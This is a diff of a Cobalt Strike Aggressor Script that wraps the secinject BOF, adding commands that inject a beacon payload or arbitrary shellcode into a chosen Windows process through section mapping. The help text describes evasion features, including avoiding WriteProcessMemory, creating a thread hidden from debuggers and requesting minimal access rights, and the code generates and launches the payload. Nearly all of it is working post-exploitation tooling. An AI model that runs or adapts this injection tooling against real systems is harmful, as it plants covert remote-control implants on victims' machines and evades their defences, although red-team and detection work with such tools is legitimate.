@@ -1,117 +1,294 @@
-beacon_command_register(
-    "sec-inject", 
-    "Injects beacon shellcode into target process using section mapping", 
-    "Synopsis: sec-inject PID LISTENER_NAME"
-);
+# secinject.cna — Aggressor Script for the secinject BOF (fork)
+#
+# Fork:   https://github.com/watson0x90/secinject  (tag patches-v3+)
+# Upstream: https://github.com/apokryptein/secinject
+#
+# Commands exposed at the beacon prompt:
+#   sec-inject   <pid> <listener>       — inject a beacon (auto x64 payload)
+#   sec-shinject <pid> <path/to/bin>    — inject arbitrary shellcode from disk
+#   sec-help                            — overview of every sec-* command + BOF status
+#
+# CS provides tab-completion on the COMMAND NAME automatically (registered
+# via beacon_command_register). We hint the argument types via the
+# %beacon_command_completer convention: "pid" and "listener" — CS clients
+# that honour this map will complete PIDs from the beacon's cached ps
+# output and listener names from the current teamserver.
 
-beacon_command_register(
-    "sec-shinject", 
-    "Injects desired shellcode into target process using section mapping", 
-    "Synopsis: sec-shinject PID /path/to/bin"
-);
 
-alias sec-shinject {
-    if(size(@_) != 3)
-    {
-        berror($1, "Incorrect usage!");
-        berror($1, beacon_command_detail("sec-shinject"));
-        return;
-    }
+# ─────────────────────────────────────────────────────────────────────────────
+# Small utilities.
+# ─────────────────────────────────────────────────────────────────────────────
 
-    local('$barch $handle $data $args');
-    
-    # Get beacon architecture
-    $barch = barch($1);
-
-    # Ensure we are in an x64 beacon
-    if ($barch !eq 'x64') {
-        berror($1, "We just support x64 at the moment.");
-        return;
-    }
-
-    # Verify PID is an integer
-    # Conditional taken from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
-    if ((!-isnumber $2) || (int($2) <= 0))
-    {
-        berror($1, "Please enter a valid PID");
-        return;
-    }
-
-    # Load BOF
-    $handle = openf(script_resource("secinject. $+ $barch $+ .o"));
+# Load the x64 BOF once per invocation (cheap; keeps aliases self-contained).
+sub _si_load_bof {
+    local('$path $handle $data');
+    $path = script_resource("secinject.x64.o");
+    if (!-exists $path) { return ""; }
+    $handle = openf($path);
+    if ($handle is $null) { return ""; }
     $data = readb($handle, -1);
     closef($handle);
+    return $data;
+}
+
+# Validate the beacon is x64 (secinject is x64-only).
+sub _si_check_x64 {
+    local('$bid $barch');
+    $bid = $1;
+    $barch = barch($bid);
+    if ($barch ne "x64") {
+        berror($bid, "[sec-inject] x64 beacons only — this one is $barch $+ .");
+        return 0;
+    }
+    return 1;
+}
+
+# Validate that a PID is a positive integer.
+sub _si_check_pid {
+    local('$bid $pid');
+    $bid = $1; $pid = $2;
+    if ($pid eq "" || $pid is $null) {
+        berror($bid, "[sec-inject] Missing PID (argument 1). See: help sec-inject");
+        return 0;
+    }
+    if (!-isnumber $pid || int($pid) <= 0) {
+        berror($bid, "[sec-inject] Invalid PID '" . $pid . "' — must be a positive integer.");
+        return 0;
+    }
+    return 1;
+}
+
+# Validate that a listener name exists on the current teamserver.
+sub _si_check_listener {
+    local('$bid $name');
+    $bid = $1; $name = $2;
+    if ($name eq "" || $name is $null) {
+        berror($bid, "[sec-inject] Missing listener (argument 2). See: help sec-inject");
+        blog($bid, "               Available listeners: " . join(", ", listeners()));
+        return 0;
+    }
+    if (($name !in listeners()) && ($name !in listeners_local()) && ($name !in listeners_stageless())) {
+        berror($bid, "[sec-inject] Unknown listener '" . $name . "'.");
+        blog($bid, "               Available: " . join(", ", listeners()));
+        return 0;
+    }
+    return 1;
+}
 
 
-    # Check if supplied file exists
-    if (!-exists $3) {
-        berror($1, "File doesn't exist");
+# ─────────────────────────────────────────────────────────────────────────────
+# beacon_command_register — this is what drives `help sec-inject` and
+# tab-completion of the COMMAND NAME. Short line shows in `help`;
+# long text shows in `help sec-inject`.
+# ─────────────────────────────────────────────────────────────────────────────
+
+beacon_command_register(
+    "sec-inject",
+    "Inject a beacon into an x64 process via section mapping (secinject BOF)",
+    "Usage:   sec-inject <pid> <listener>\n\n" .
+    "Arguments:\n" .
+    "  <pid>       Target process ID (positive integer). Must be an x64 process\n" .
+    "              in the same session as the current beacon.\n" .
+    "  <listener>  Cobalt Strike listener name. An x64 stageless payload is\n" .
+    "              generated automatically via payload(name, \"x64\", \"thread\").\n\n" .
+    "OPSEC:\n" .
+    "  Runs the secinject BOF via inline-execute — no fork-and-run, no child\n" .
+    "  process, no WriteProcessMemory. Target's remote view is mapped\n" .
+    "  PAGE_EXECUTE_READ (no RWX). Thread is created via NtCreateThreadEx\n" .
+    "  with THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER. Target-process rights:\n" .
+    "  0x100A (minimal), not PROCESS_ALL_ACCESS. See fork README for full\n" .
+    "  patch list: https://github.com/watson0x90/secinject\n\n" .
+    "Prereq:\n" .
+    "  secinject.x64.o must sit next to this .cna (both loaded via Script\n" .
+    "  Manager). BOF is x64-only.\n\n" .
+    "Example:\n" .
+    "  beacon> sec-inject 4812 https-listener"
+);
+
+beacon_command_register(
+    "sec-shinject",
+    "Inject arbitrary shellcode from disk into an x64 process via section mapping",
+    "Usage:   sec-shinject <pid> <path/to/bin>\n\n" .
+    "Arguments:\n" .
+    "  <pid>              Target process ID (positive integer, x64 process\n" .
+    "                     in the same session as the current beacon).\n" .
+    "  <path/to/bin>      Path to a raw shellcode .bin file on the operator's\n" .
+    "                     machine (this box, not the target). Read verbatim\n" .
+    "                     and section-mapped into the target as-is.\n\n" .
+    "OPSEC:\n" .
+    "  Same primitives as sec-inject — section mapping, RX remote view,\n" .
+    "  NtCreateThreadEx hidden from debugger, 0x100A target rights.\n\n" .
+    "Example:\n" .
+    "  beacon> sec-shinject 4812 C:\\Payloads\\custom.bin"
+);
+
+beacon_command_register(
+    "sec-help",
+    "Overview of every sec-* command + secinject BOF load state",
+    "Usage:   sec-help\n\n" .
+    "Prints the full sec-* command list, per-command synopsis, and the\n" .
+    "current secinject.x64.o load state (present / missing, size). Use this\n" .
+    "as the first stop when you're not sure what's available."
+);
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# %beacon_command_completer — CS clients that honour this hash use it for
+# positional tab-completion. Slots are 1-indexed argument positions;
+# "pid" completes to cached PIDs from `ps`, "listener" to teamserver
+# listener names. Silently ignored by CS versions that don't implement
+# this — costs nothing to include.
+# ─────────────────────────────────────────────────────────────────────────────
+
+%beacon_command_completer["sec-inject"]   = @("pid", "listener");
+%beacon_command_completer["sec-shinject"] = @("pid", "file");
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# sec-help — overview + BOF status.
+# ─────────────────────────────────────────────────────────────────────────────
+
+alias sec-help {
+    local('$bid $bof $bof_size');
+    $bid = $1;
+    $bof = _si_load_bof();
+    $bof_size = iff($bof ne "", strlen($bof) . " bytes", "MISSING");
+
+    blog($bid, "═══ secinject aggressor — command overview ═══");
+    blog($bid, "");
+    blog($bid, "  sec-inject   <pid> <listener>      Beacon → x64 target via section mapping");
+    blog($bid, "  sec-shinject <pid> <path/to/bin>   Custom shellcode → x64 target");
+    blog($bid, "  sec-help                           This overview");
+    blog($bid, "");
+    blog($bid, "For per-command detail:  help sec-inject   /   help sec-shinject");
+    blog($bid, "");
+    blog($bid, "BOF status:");
+    blog($bid, "  Path: " . script_resource("secinject.x64.o"));
+    blog($bid, "  State: " . $bof_size);
+    if ($bof eq "") {
+        blog($bid, "  → Fix: pull the current release from https://github.com/watson0x90/secinject");
+        blog($bid, "         drop secinject.x64.o next to secinject.cna, reload in Script Manager");
+    }
+    blog($bid, "");
+    blog($bid, "Fork:     https://github.com/watson0x90/secinject  (tag patches-v3+)");
+    blog($bid, "Upstream: https://github.com/apokryptein/secinject");
+}
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# sec-inject — beacon shellcode into target via section mapping.
+# ─────────────────────────────────────────────────────────────────────────────
+
+alias sec-inject {
+    local('$bid $pid $listener $bof $payload $args');
+    $bid = $1; $pid = $2; $listener = $3;
+
+    # Argument count first — clearer than falling through to per-arg checks.
+    if (size(@_) != 3) {
+        berror($bid, "[sec-inject] Wrong argument count (expected 2, got " . (size(@_) - 1) . ").");
+        berror($bid, "             Usage: sec-inject <pid> <listener>");
+        berror($bid, "             Detail: help sec-inject");
         return;
     }
 
+    if (!_si_check_x64($bid))               { return; }
+    if (!_si_check_pid($bid, $pid))         { return; }
+    if (!_si_check_listener($bid, $listener)) { return; }
 
-    # Read shellcode from bin
-    local('$sc_handle $sc_data');
-    $sc_handle = openf($3);
+    $bof = _si_load_bof();
+    if ($bof eq "") {
+        berror($bid, "[sec-inject] BOF missing: " . script_resource("secinject.x64.o"));
+        berror($bid, "             Pull the current release from https://github.com/watson0x90/secinject");
+        return;
+    }
+
+    # Explicit x64 payload — plain payload($listener) returns x86, which
+    # crashes an x64 target on first execution (invalid opcodes).
+    $payload = payload($listener, "x64", "thread");
+    if ($payload eq "" || $payload is $null) {
+        berror($bid, "[sec-inject] payload('" . $listener . "', \"x64\", \"thread\") returned empty.");
+        berror($bid, "             Confirm '" . $listener . "' is configured with an x64 stageless payload.");
+        return;
+    }
+
+    $args = bof_pack($bid, "ib", int($pid), $payload);
+
+    btask($bid, "secinject: beacon → PID " . $pid . " via '" . $listener . "' (section mapping, RX remote view, HIDE_FROM_DEBUGGER)");
+    beacon_inline_execute($bid, $bof, "go", $args);
+}
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# sec-shinject — arbitrary shellcode from a local .bin file.
+# ─────────────────────────────────────────────────────────────────────────────
+
+alias sec-shinject {
+    local('$bid $pid $path $bof $sc_handle $sc_data $args');
+    $bid = $1; $pid = $2; $path = $3;
+
+    if (size(@_) != 3) {
+        berror($bid, "[sec-shinject] Wrong argument count (expected 2, got " . (size(@_) - 1) . ").");
+        berror($bid, "               Usage: sec-shinject <pid> <path/to/bin>");
+        berror($bid, "               Detail: help sec-shinject");
+        return;
+    }
+
+    if (!_si_check_x64($bid))       { return; }
+    if (!_si_check_pid($bid, $pid)) { return; }
+
+    if ($path eq "" || $path is $null) {
+        berror($bid, "[sec-shinject] Missing shellcode path (argument 2).");
+        berror($bid, "               Usage: sec-shinject <pid> <path/to/bin>");
+        return;
+    }
+    if (!-exists $path) {
+        berror($bid, "[sec-shinject] File not found: '" . $path . "'");
+        berror($bid, "               Path is on the operator's machine (this box), not the target.");
+        return;
+    }
+
+    $bof = _si_load_bof();
+    if ($bof eq "") {
+        berror($bid, "[sec-shinject] BOF missing: " . script_resource("secinject.x64.o"));
+        berror($bid, "               Pull the current release from https://github.com/watson0x90/secinject");
+        return;
+    }
+
+    $sc_handle = openf($path);
+    if ($sc_handle is $null) {
+        berror($bid, "[sec-shinject] Could not open '" . $path . "' for reading.");
+        return;
+    }
     $sc_data = readb($sc_handle, -1);
     closef($sc_handle);
 
-    # Pack args
-    $args = bof_pack($1,"ib", $2, $sc_data);
-    
-    btask($1, "SecInject: Section Mapping Process Injection (@apokryptein | github.com/apokryptein)");
-    btask($1, "Injecting shellcode: $+ $3");
-    btask($1, "Target Process: $+ $2");
+    if ($sc_data eq "" || strlen($sc_data) == 0) {
+        berror($bid, "[sec-shinject] '" . $path . "' is empty — nothing to inject.");
+        return;
+    }
 
-    beacon_inline_execute($1, $data, "go", $args);
+    $args = bof_pack($bid, "ib", int($pid), $sc_data);
+
+    btask($bid, "secinject: shellcode from '" . $path . "' (" . strlen($sc_data) . " bytes) → PID " . $pid);
+    beacon_inline_execute($bid, $bof, "go", $args);
 }
 
-alias sec-inject {
-    if(size(@_) != 3)
-    {
-        berror($1, "Incorrect usage!");
-        berror($1, beacon_command_detail("sec-inject"));
-        return;
+
+# ─────────────────────────────────────────────────────────────────────────────
+# Load-time banner — confirms the script loaded and shows BOF state so an
+# operator knows immediately if the .x64.o is missing.
+# ─────────────────────────────────────────────────────────────────────────────
+
+sub _si_startup_banner {
+    local('$bof $state');
+    $bof = _si_load_bof();
+    $state = iff($bof ne "", "loaded (" . strlen($bof) . " bytes)", "MISSING");
+    say("[secinject] aggressor loaded. BOF: " . $state);
+    if ($bof eq "") {
+        say("[secinject] Drop secinject.x64.o next to this .cna. Get it at:");
+        say("[secinject]   https://github.com/watson0x90/secinject/tree/main/dist");
     }
-
-    local('$barch $handle $data $args');
-    
-    # Get beacon architecture
-    $barch = barch($1);
-
-    # Ensure we are in an x64 beacon
-    if ($barch !eq 'x64') {
-        berror($1, "We just support x64 at the moment.");
-        return;
-    }
-
-    # Verify PID is an integer
-    # Conditional borrowed from: https://github.com/connormcgarr/cThreadHijack/blob/main/cThreadHijack.cna
-    if ((!-isnumber $2) || (int($2) <= 0))
-    {
-        berror($1, "Please enter a valid PID");
-        return;
-    }
-
-    # Verify listener exists
-    if (($3 !in listeners()) && ($3 !in listeners_local()) && ($3 !in listeners_stageless())) {
-        berror($1, "That listener seems invalid.");
-        return;
-    }
-
-    # Load BOF
-    $handle = openf(script_resource("secinject. $+ $barch $+ .o"));
-    $data = readb($handle, -1);
-    closef($handle);
-
-    # Generate payload based on supplied beacon (currently x64 only)
-    local('$payload');
-    $payload = payload($3, "x64", "thread");
-
-    # Pack args
-    $args = bof_pack($1,"ib", $2, $payload);
-    btask($1, "SecInject: Section Mapping Process Injection (@apokryptein | github.com/apokryptein)");
-    btask($1, "Injecting beacon into PID: $+ $2");
-
-    beacon_inline_execute($1, $data, "go", $args);
+    say("[secinject] Commands: sec-inject / sec-shinject / sec-help  (or `help sec-inject` for detail)");
 }
+
+_si_startup_banner();
